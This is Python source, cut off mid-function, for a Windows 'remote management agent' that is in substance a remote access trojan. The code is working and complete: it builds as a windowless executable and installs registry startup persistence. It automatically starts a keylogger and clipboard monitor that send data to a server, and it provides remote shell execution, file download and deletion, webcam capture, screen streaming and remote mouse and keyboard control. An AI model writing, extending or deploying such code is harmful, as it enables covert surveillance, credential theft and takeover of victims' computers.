"""
╔══════════════════════════════════════════════════════════════════╗
║          M-VIEW MASTER AGENT  v3.0                               ║
║          Remote Management & Monitoring Agent                    ║
║                                                                  ║
║  Features:                                                       ║
║  • Live screen capture & streaming                               ║
║  • Full system telemetry (CPU, RAM, GPU, Disk, Network, Temp)    ║
║  • Remote shell command execution                                ║
║  • File system browser & transfer                                ║
║  • Process manager (list, kill, start)                           ║
║  • Keylogger capture (input monitoring)                          ║
║  • Clipboard monitor                                             ║
║  • Webcam capture                                                ║
║  • Audio level monitoring                                        ║
║  • Screenshot scheduler                                          ║
║  • Auto-reconnect with exponential backoff                       ║
║  • Startup persistence (Windows registry)                        ║
║  • AES-256 encrypted payloads                                    ║
║  • Heartbeat & watchdog                                          ║
╚══════════════════════════════════════════════════════════════════╝

BUILD COMMAND:
  pyinstaller --onefile --noconsole --icon=icon.ico \
    --distpath ./bin --name master_agent \
    --hidden-import=engineio.async_drivers.threading \
    --hidden-import=pkg_resources.extern \
    agent_source.py

DEPENDENCIES:
  pip install python-socketio[client] mss Pillow psutil \
              pywin32 pynput pyperclip cryptography \
              opencv-python-headless numpy requests wmi pyautogui
"""

# ── Standard Library ─────────────────────────────────────────────
import os
import sys
import time
import json
import base64
import hashlib
import socket
import platform
import threading
import subprocess
import tempfile
import logging
import winreg                  # Windows registry for persistence
import ctypes
import uuid
from io import BytesIO
from pathlib import Path
from datetime import datetime
from queue import Queue, Empty

# ── Third-Party ──────────────────────────────────────────────────
import socketio
import mss
import psutil
import requests
from PIL import Image
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Optional imports — handled gracefully if missing
try:
    import pyautogui
    pyautogui.FAILSAFE = False  # Disable corner failsafe for remote control
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False

try:
    import pynput.keyboard
    import pynput.mouse
    INPUT_MONITOR_AVAILABLE = True
except ImportError:
    INPUT_MONITOR_AVAILABLE = False

try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False

try:
    import wmi
    WMI_AVAILABLE = True
except ImportError:
    WMI_AVAILABLE = False

# ════════════════════════════════════════════════════════════════
#  TRAILER TOKEN READER
#  The server appends a 64-byte trailer to the exe at download time:
#    [0:4]  b"MVTK"  — magic header
#    [4:60] token    — utf-8, null-padded to 56 bytes
#    [60:64] b"MVED" — magic tail
#  We read it here at startup — completely bypasses PyInstaller
#  bytecode compression which hides all Python string constants.
# ════════════════════════════════════════════════════════════════
_TRAILER_SIZE  = 64
_MAGIC_HEAD    = b"MVTK"
_MAGIC_TAIL    = b"MVED"
_TOKEN_OFFSET  = 4
_TOKEN_LENGTH  = 56

def _read_token_from_trailer() -> str:
    """Read device token injected as a binary trailer by the server."""
    try:
        exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
        data = exe.read_bytes()
        if len(data) < _TRAILER_SIZE:
            return ""
        trailer = data[-_TRAILER_SIZE:]
        if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
            return ""   # no trailer found — running unpatched build
        token_bytes = trailer[_TOKEN_OFFSET : _TOKEN_OFFSET + _TOKEN_LENGTH]
        return token_bytes.rstrip(b"\x00").decode("utf-8").strip()
    except Exception as e:
        return ""


# ════════════════════════════════════════════════════════════════
#  CONFIGURATION  — Edit before compiling
# ════════════════════════════════════════════════════════════════
CONFIG = {
    # ── Connection ───────────────────────────────────────────────
    "SERVER_URL":          "http://192.168.0.100:5000",  # ← YOUR server IP
    # Token is injected as a binary trailer by the server at download time.
    # _read_token_from_trailer() is called immediately after this dict — do not
    # rely on this string value at runtime.
    "DEVICE_TOKEN":        "UNSET",

    # ── Identity ─────────────────────────────────────────────────
    "AGENT_VERSION":       "3.0.0",
    "HEARTBEAT_INTERVAL":  10,    # seconds between heartbeats
    "RECONNECT_BASE":      3,     # initial reconnect delay (seconds)
    "RECONNECT_MAX":       120,   # max reconnect delay (seconds)

    # ── Screen Streaming ─────────────────────────────────────────
    "STREAM_FPS":          15,    # target frames per second
    "STREAM_QUALITY":      45,    # JPEG quality (1-95)
    "STREAM_SCALE":        0.75,  # scale factor for capture
    "STREAM_MONITOR":      1,     # monitor index (1 = primary)

    # ── Security ─────────────────────────────────────────────────
    "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
    "ENCRYPT_PAYLOADS":    False,   # Keep False — server/dashboard do not decrypt

    # ── Persistence ──────────────────────────────────────────────
    "INSTALL_PERSISTENCE": True,
    "REG_KEY_NAME":        "MViewSystemService",
    "STARTUP_DELAY":       5,     # seconds before first connect

    # ── Features ─────────────────────────────────────────────────
    "ENABLE_KEYLOGGER":    True,
    "ENABLE_CLIPBOARD":    True,
    "ENABLE_WEBCAM":       True,
    "ENABLE_PROCESS_MGR":  True,
    "ENABLE_FILE_BROWSER": True,
    "ENABLE_SHELL":        True,
    "KEYLOG_FLUSH_INTERVAL": 30,  # flush keylog every N seconds
}

# ── Load token from binary trailer (injected by server at download time) ──
_trailer_token = _read_token_from_trailer()
if _trailer_token:
    CONFIG["DEVICE_TOKEN"] = _trailer_token
else:
    # Fallback: if running the raw .py (dev mode), you can set token here
    CONFIG["DEVICE_TOKEN"] = "UNSET-RUN-VIA-SERVER"

# ════════════════════════════════════════════════════════════════
#  LOGGING SETUP  (writes to temp folder, stays hidden)
# ════════════════════════════════════════════════════════════════
LOG_FILE = Path(tempfile.gettempdir()) / "mview_agent.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        # No StreamHandler — stays silent in noconsole mode
    ]
)
log = logging.getLogger("mview-agent")


# ════════════════════════════════════════════════════════════════
#  ENCRYPTION MODULE
# ════════════════════════════════════════════════════════════════
class Encryptor:
    def __init__(self, password: str):
        salt = b"mview_salt_2024_"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self._fernet = Fernet(key)

    def encrypt(self, data: str) -> str:
        return self._fernet.encrypt(data.encode()).decode()

    def decrypt(self, token: str) -> str:
        return self._fernet.decrypt(token.encode()).decode()

    def encrypt_bytes(self, data: bytes) -> bytes:
        return self._fernet.encrypt(data)


_encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])


def safe_emit(sio_client, event: str, payload: dict):
    """Emit with optional AES-256 encryption."""
    if CONFIG["ENCRYPT_PAYLOADS"]:
        raw = json.dumps(payload)
        encrypted = _encryptor.encrypt(raw)
        sio_client.emit(event, {"encrypted": True, "data": encrypted})
    else:
        sio_client.emit(event, payload)


# ════════════════════════════════════════════════════════════════
#  DEVICE IDENTITY
# ════════════════════════════════════════════════════════════════
def get_device_id() -> str:
    """Generate a stable hardware-based device ID."""
    try:
        mac = uuid.getnode()
        hostname = socket.gethostname()
        raw = f"{mac}-{hostname}-{CONFIG['DEVICE_TOKEN']}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
    except Exception:
        return CONFIG["DEVICE_TOKEN"]


def get_device_fingerprint() -> dict:
    """Full device info sent on first connection."""
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "unknown"

    uname = platform.uname()

    fingerprint = {
        "device_id":     CONFIG["DEVICE_TOKEN"],
        "hardware_id":   get_device_id(),
        "hostname":      socket.gethostname(),
        "username":      os.getenv("USERNAME") or os.getenv("USER") or "unknown",
        "os":            f"{uname.system} {uname.release}",
        "os_version":    uname.version,
        "machine":       uname.machine,
        "processor":     uname.processor,
        "local_ip":      local_ip,
        "agent_version": CONFIG["AGENT_VERSION"],
        "token":         CONFIG["DEVICE_TOKEN"],
        "timestamp":     datetime.utcnow().isoformat(),
        "screen_count":  _get_screen_count(),
        "cpu_count":     psutil.cpu_count(logical=True),
        "ram_total_gb":  round(psutil.virtual_memory().total / (1024**3), 2),
    }

    # Add GPU info if WMI is available
    if WMI_AVAILABLE:
        try:
            c = wmi.WMI()
            gpus = [g.Name for g in c.Win32_VideoController()]
            fingerprint["gpu"] = ", ".join(gpus) if gpus else "unknown"
        except Exception:
            fingerprint["gpu"] = "unknown"

    return fingerprint


def _get_screen_count() -> int:
    try:
        with mss.mss() as sct:
            return len(sct.monitors) - 1  # minus the "all monitors" entry
    except Exception:
        return 1


# ════════════════════════════════════════════════════════════════
#  PERSISTENCE MODULE
# ════════════════════════════════════════════════════════════════
def install_persistence():
    """Add agent to Windows startup via registry (HKCU — no admin needed)."""
    if not CONFIG["INSTALL_PERSISTENCE"]:
        return
    try:
        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, f'"{exe_path}"')
        log.info(f"Persistence installed: {exe_path}")
    except Exception as e:
        log.warning(f"Persistence install failed (non-fatal): {e}")


def remove_persistence():
    """Remove registry startup entry."""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, CONFIG["REG_KEY_NAME"])
        log.info("Persistence removed.")
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════
#  SCREEN CAPTURE MODULE
# ════════════════════════════════════════════════════════════════
class ScreenStreamer:
    def __init__(self, sio_client):
        self.sio = sio_client
        self.streaming = False
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()
        self.fps = CONFIG["STREAM_FPS"]
        self.quality = CONFIG["STREAM_QUALITY"]
        self.scale = CONFIG["STREAM_SCALE"]
        self.monitor_idx = CONFIG["STREAM_MONITOR"]

    def start(self, monitor: int = None, fps: int = None, quality: int = None):
        with self._lock:
            if self.streaming:
                return
            if monitor is not None: self.monitor_idx = monitor
            if fps is not None:     self.fps = fps
            if quality is not None: self.quality = quality
            self.streaming = True
            self._thread = threading.Thread(target=self._capture_loop, daemon=True)
            self._thread.start()
            log.info(f"Screen stream started: monitor={self.monitor_idx} fps={self.fps}")

    def stop(self):
        with self._lock:
            self.streaming = False
        if self._thread:
            self._thread.join(timeout=3)
        log.info("Screen stream stopped.")

    def capture_single(self) -> str | None:
        """Take one screenshot and return as base64 JPEG."""
        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                idx = min(self.monitor_idx, len(monitors) - 1)
                raw = sct.grab(monitors[idx])
                img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                if self.scale != 1.0:
                    w = int(img.width  * self.scale)
                    h = int(img.height * self.scale)
                    img = img.resize((w, h), Image.LANCZOS)
                buf = BytesIO()
                img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                return base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log.error(f"Screenshot error: {e}")
            return None

    def _capture_loop(self):
        interval = 1.0 / self.fps
        with mss.mss() as sct:
            while self.streaming:
                t0 = time.monotonic()
                try:
                    monitors = sct.monitors
                    idx = min(self.monitor_idx, len(monitors) - 1)
                    raw = sct.grab(monitors[idx])
                    img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                    if self.scale != 1.0:
                        w = int(img.width  * self.scale)
                        h = int(img.height * self.scale)
                        img = img.resize((w, h), Image.LANCZOS)
                    buf = BytesIO()
                    img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                    frame_b64 = base64.b64encode(buf.getvalue()).decode()
                    self.sio.emit("screen_data", {
                        "image":     frame_b64,
                        "frame":     frame_b64,   # dashboard expects "frame"
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "monitor":   idx,
                        "w":         img.width,
                        "h":         img.height,
                        "ts":        datetime.utcnow().isoformat(),
                    })
                except Exception as e:
                    log.error(f"Stream frame error: {e}")
                elapsed = time.monotonic() - t0
                sleep_t = max(0, interval - elapsed)
                time.sleep(sleep_t)


# ════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio = sio_client
        self.monitoring = False
        self._thread: threading.Thread | None = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(
            target=self._monitor_loop, args=(interval,), daemon=True
        )
        self._thread.start()
        log.info("System monitor started.")

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        """Full system stats snapshot."""
        vm = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        net = psutil.net_io_counters()
        cpu_per_core = psutil.cpu_percent(percpu=True)
        battery = psutil.sensors_battery()

        stats = {
            "device_id":      CONFIG["DEVICE_TOKEN"],
            "ts":             datetime.utcnow().isoformat(),

            # CPU
            "cpu_percent":    psutil.cpu_percent(interval=0.1),
            "cpu_per_core":   cpu_per_core,
            "cpu_count":      psutil.cpu_count(logical=True),
            "cpu_freq_mhz":   round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,

            # Memory
            "ram_total_gb":   round(vm.total    / (1024**3), 2),
            "ram_used_gb":    round(vm.used     / (1024**3), 2),
            "ram_free_gb":    round(vm.available/ (1024**3), 2),
            "ram_percent":    vm.percent,

            # Disk
            "disk_total_gb":  round(disk.total / (1024**3), 2),
            "disk_used_gb":   round(disk.used  / (1024**3), 2),
            "disk_free_gb":   round(disk.free  / (1024**3), 2),
            "disk_percent":   disk.percent,

            # Network
            "net_sent_mb":    round(net.bytes_sent / (1024**2), 2),
            "net_recv_mb":    round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,

            # Battery
            "battery_pct":    battery.percent      if battery else None,
            "battery_plug":   battery.power_plugged if battery else None,

            # Uptime
            "boot_time":      datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":     round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        # Temperature (Windows — requires WMI)
        if WMI_AVAILABLE:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                sensors = c.Sensor()
                temps = {s.Name: round(s.Value, 1) for s in sensors if s.SensorType == "Temperature"}
                stats["temperatures"] = temps
            except Exception:
                stats["temperatures"] = {}
        else:
            stats["temperatures"] = {}

        # GPU (basic)
        if WMI_AVAILABLE:
            try:
                c = wmi.WMI()
                gpu_list = []
                for g in c.Win32_VideoController():
                    gpu_list.append({
                        "name":   g.Name,
                        "driver": g.DriverVersion,
                        "status": g.Status,
                    })
                stats["gpus"] = gpu_list
            except Exception:
                stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        """List all disk partitions with usage."""
        result = []
        for part in psutil.disk_partitions(all=False):
            try:
                usage = psutil.disk_usage(part.mountpoint)
                result.append({
                    "device":    part.device,
                    "mountpoint": part.mountpoint,
                    "fstype":    part.fstype,
                    "total_gb":  round(usage.total / (1024**3), 2),
                    "used_gb":   round(usage.used  / (1024**3), 2),
                    "free_gb":   round(usage.free  / (1024**3), 2),
                    "percent":   usage.percent,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        """All network interface addresses."""
        addrs = {}
        for iface, addr_list in psutil.net_if_addrs().items():
            addrs[iface] = [
                {"family": str(a.family), "address": a.address, "netmask": a.netmask}
                for a in addr_list
            ]
        return addrs

    def _monitor_loop(self, interval: int):
        while self.monitoring:
            try:
                stats = self.get_snapshot()
                self.sio.emit("system_stats_report", stats)
            except Exception as e:
                log.error(f"System monitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════
#  PROCESS MANAGER MODULE
# ════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
                                       "memory_percent", "username", "create_time"]):
            try:
                info = p.info
                info["memory_mb"] = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info["create_time"] else None
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            time.sleep(0.5)
            if p.is_running():
                p.kill()
            return {"success": True, "message": f"Process '{name}' (PID {pid}) terminated."}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════
#  FILE BROWSER MODULE
# ════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB   = 50
    CHUNK_SIZE      = 65536  # 64 KB chunks for file reading

    @staticmethod
    def list_directory(path: str) -> dict:
        """List contents of a directory."""
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"Path not found: {path}"}
            if not p.is_dir():
                return {"error": f"Not a directory: {path}"}

            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "hidden":   item.name.startswith("."),
                    })
                except (PermissionError, OSError):
                    pass

            return {
                "path":    str(p),
                "parent":  str(p.parent),
                "entries": entries,
                "count":   len(entries),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 512) -> dict:
        """Read a text file and return its content (up to max_kb)."""
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB limit)."}

            # Try UTF-8 first, fall back to latin-1
            try:
                content = p.read_text(encoding="utf-8")
            except UnicodeDecodeError:
                content = p.read_text(encoding="latin-1")

            return {
                "path":    str(p),
                "content": content,
                "size_kb": round(size_kb, 2),
                "lines":   content.count("\n"),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        """Read a binary file and return as base64."""
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB)."}

            data_b64 = base64.b64encode(p.read_bytes()).decode()
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     data_b64,
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                import shutil
                shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted directory: {path}"}
            else:
                return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def list_drives() -> list:
        """List available drive letters (Windows)."""
        drives = []
        for part in psutil.disk_partitions(all=False):
            try:
                usage = psutil.disk_usage(part.mountpoint)
                drives.append({
                    "drive":    part.mountpoint,
                    "total_gb": round(usage.total / (1024**3), 2),
                    "free_gb":  round(usage.free  / (1024**3), 2),
                    "percent":  usage.percent,
                    "fstype":   part.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════
#  SHELL MODULE
# ════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 30  # seconds max per command

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        """Execute a shell command and return output."""
        t0 = time.time()
        try:
            if shell_type == "powershell":
                cmd = ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
            else:
                cmd = command

            result = subprocess.run(
                cmd,
                shell=(shell_type == "cmd"),
                capture_output=True,
                text=True,
                timeout=RemoteShell.TIMEOUT,
            )
            elapsed = round(time.time() - t0, 3)
            return {
                "success":   True,
                "command":   command,
                "stdout":    result.stdout[-8192:],  # cap at 8 KB
                "stderr":    result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s": elapsed,
                "ts":        datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": "Command timed out (30s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}


# ════════════════════════════════════════════════════════════════
#  KEYLOGGER MODULE
# ════════════════════════════════════════════════════════════════
class KeyLogger:
    def __init__(self, sio_client):
        self.sio  = sio_client
        self._buf: list[str] = []
        self._lock = threading.Lock()
        self._listener = None
        self._flush_thread: threading.Thread | None = None
        self.running = False

    def start(self):
        if not INPUT_MONITOR_AVAILABLE or self.running:
            return
        self.running = True
        self._listener = pynput.keyboard.Listener(on_press=self._on_key)
        self._listener.start()
        self._flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_thread.start()
        log.info("Keylogger started.")

    def stop(self):
        self.running = False
        if self._listener:
            self._listener.stop()

    def _on_key(self, key):
        try:
            with self._lock:
                if hasattr(key, "char") and key.char:
                    self._buf.append(key.char)
                else:
                    self._buf.append(f"[{str(key).replace('Key.', '')}]")
        except Exception:
            pass

    def _flush_loop(self):
        interval = CONFIG["KEYLOG_FLUSH_INTERVAL"]
        while self.running:
            time.sleep(interval)
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buf:
                return
            text = "".join(self._buf)
            self._buf.clear()

        self.sio.emit("keylog_data", {
            "device_id": CONFIG["DEVICE_TOKEN"],
            "text":      text,
            "ts":        datetime.utcnow().isoformat(),
        })


# ════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ════════════════════════════════════════════════════════════════
class ClipboardMonitor:
    def __init__(self, sio_client):
        self.sio = sio_client
        self._last = ""
        self._thread: threading.Thread | None = None
        self.running = False

    def start(self):
        if not CLIPBOARD_AVAILABLE or self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._thread.start()
        log.info("Clipboard monitor started.")

    def stop(self):
        self.running = False

    def _monitor_loop(self):
        while self.running:
            try:
                current = pyperclip.paste()
                if current and current != self._last:
                    self._last = current
                    self.sio.emit("clipboard_data", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content":   current[:4096],  # cap at 4 KB
                        "length":    len(current),
                        "ts":        datetime.utcnow().isoformat(),
                    })
            except Exception:
                pass
            time.sleep(2)


# ════════════════════════════════════════════════════════════════
#  WEBCAM MODULE
# ════════════════════════════════════════════════════════════════
class WebcamCapture:
    def __init__(self, sio_client):
        self.sio = sio_client

    def capture(self, camera_idx: int = 0) -> dict:
        if not WEBCAM_AVAILABLE:
            return {"error": "OpenCV not available on this agent."}
        try:
            cap = cv2.VideoCapture(camera_idx, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return {"error": f"Camera {camera_idx} not available."}
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return {"error": "Failed to capture frame."}
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            img_b64 = base64.b64encode(buf.tobytes()).decode()
            return {
                "success":    True,
                "device_id":  CONFIG["DEVICE_TOKEN"],
                "camera_idx": camera_idx,
                "image":      img_b64,
                "ts":         datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    def list_cameras(self) -> list:
        """Probe camera indices 0-4."""
        if not WEBCAM_AVAILABLE:
            return []
        available = []
        for idx in range(5):
            try:
                cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
                if cap.isOpened():
                    available.append(idx)
                cap.release()
            except Exception:
                pass
        return available


# ════════════════════════════════════════════════════════════════
#  HEARTBEAT MODULE
# ════════════════════════════════════════════════════════════════
class Heartbeat:
    def __init__(self, sio_client):
        self.sio = sio_client
        self._thread: threading.Thread | None = None
        self.running = False

    def start(self):
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def _loop(self):
        while self.running:
            try:
                self.sio.emit("heartbeat", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "ts":        datetime.utcnow().isoformat(),
                    "cpu":       psutil.cpu_percent(interval=0),
                    "ram":       psutil.virtual_memory().percent,
                })
            except Exception as e:
                log.warning(f"Heartbeat error: {e}")
            time.sleep(CONFIG["HEARTBEAT_INTERVAL"])


# ════════════════════════════════════════════════════════════════
#  MAIN AGENT CLASS
# ════════════════════════════════════════════════════════════════
class MViewAgent:
    def __init__(self):
        self.sio         = socketio.Client(logger=False, engineio_logger=False)
        self.streamer    = ScreenStreamer(self.sio)
        self.sys_monitor = SystemMonitor(self.sio)
        self.keylogger   = KeyLogger(self.sio)
        self.clipboard   = ClipboardMonitor(self.sio)
        self.webcam      = WebcamCapture(self.sio)
        self.shell       = RemoteShell()
        self.proc_mgr    = ProcessManager()
        self.files       = FileBrowser()
        self.heartbeat   = Heartbeat(self.sio)

        self._reconnect_delay = CONFIG["RECONNECT_BASE"]
        self._connected       = False

        self._register_events()

    # ── Socket Events ─────────────────────────────────────────────
    def _register_events(self):
        sio = self.sio

        @sio.event
        def connect():
            self._connected       = True
            self._reconnect_delay = CONFIG["RECONNECT_BASE"]
            log.info(f"Connected to server: {CONFIG['SERVER_URL']}")
            # Announce with full fingerprint — ensure device_id is always the TOKEN
            fp = get_device_fingerprint()
            fp["device_id"] = CONFIG["DEVICE_TOKEN"]   # guarantee server gets the right key
            fp["token"]     = CONFIG["DEVICE_TOKEN"]
            sio.emit("agent_connect", fp)
            # Start background services
            self.heartbeat.start()
            if CONFIG["ENABLE_KEYLOGGER"]:  self.keylogger.start()
            if CONFIG["ENABLE_CLIPBOARD"]:  self.clipboard.start()

        @sio.event
        def disconnect():
            self._connected = False
            log.warning("Disconnected from server.")
            self.streamer.stop()
            self.sys_monitor.stop()
            self.heartbeat.stop()

        # ── DASHBOARD COMMANDS ─────────────────────────────────────
        @sio.on("request_action")
        def on_action(data):
            tab = data.get("tab", "")
            log.info(f"Action requested: {tab}  params={data}")

            if tab == "monitor":
                action = data.get("action", "start")
                if action == "start":
                    self.streamer.start(
                        monitor=data.get("monitor", 1),
                        fps=data.get("fps", CONFIG["STREAM_FPS"]),
                        quality=data.get("quality", CONFIG["STREAM_QUALITY"]),
                    )
                else:
                    self.streamer.stop()

            elif tab == "screenshot":
                # Single on-demand screenshot — apply quality/scale from request
                q = data.get("quality", CONFIG["STREAM_QUALITY"])
                s = data.get("scale",   CONFIG["STREAM_SCALE"])
                old_q, old_s = self.streamer.quality, self.streamer.scale
                self.streamer.quality, self.streamer.scale = q, s
                img = self.streamer.capture_single()
                self.streamer.quality, self.streamer.scale = old_q, old_s
                if img:
                    w_info = None
                    try:
                        with mss.mss() as sct:
                            mon = sct.monitors[min(self.streamer.monitor_idx, len(sct.monitors)-1)]
                            w_info = (int(mon["width"]*s), int(mon["height"]*s))
                    except Exception:
                        pass
                    payload = {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame":     img,
                        "image":     img,
                        "ts":        datetime.utcnow().isoformat(),
                    }
                    if w_info:
                        payload["w"], payload["h"] = w_info
                    sio.emit("screenshot_result", payload)

            elif tab == "mouse_event":
                if PYAUTOGUI_AVAILABLE:
                    x, y    = int(data.get("x", 0)), int(data.get("y", 0))
                    mtype   = data.get("type", "move")
                    btn_map = {0: "left", 1: "middle", 2: "right"}
                    btn     = btn_map.get(int(data.get("button", 0)), "left")
                    try:
                        if mtype == "move":
                            pyautogui.moveTo(x, y, duration=0, _pause=False)
                        elif mtype == "down":
                            pyautogui.mouseDown(x, y, button=btn, _pause=False)
                        elif mtype == "up":
                            pyautogui.mouseUp(x, y, button=btn, _pause=False)
                        elif mtype == "rclick":
                            pyautogui.click(x, y, button="right", _pause=False)
                        elif mtype == "dblclick":
                            pyautogui.doubleClick(x, y, _pause=False)
                    except Exception as e:
                        log.warning(f"mouse_event error: {e}")

            elif tab == "scroll_event":
                if PYAUTOGUI_AVAILABLE:
                    try:
                        x, y = int(data.get("x", 0)), int(data.get("y", 0))
                        dy   = data.get("dy", 0)
                        # pyautogui scroll: positive = up, negative = down
                        clicks = int(-dy / 100) if dy else 0
                        if clicks:
                            pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                    except Exception as e:
                        log.warning(f"scroll_event error: {e}")

            elif tab == "key_event":
                if PYAUTOGUI_AVAILABLE:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    try:
                        if combo == "ctrl+alt+del":
                            # Simulate via shell (safest on Windows)
                            import subprocess
                            subprocess.Popen(["powershell", "-Command",
                                "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW)
                        elif ktype in ("down", "press"):
                            # Map JS key names → pyautogui key names
                            key_map = {
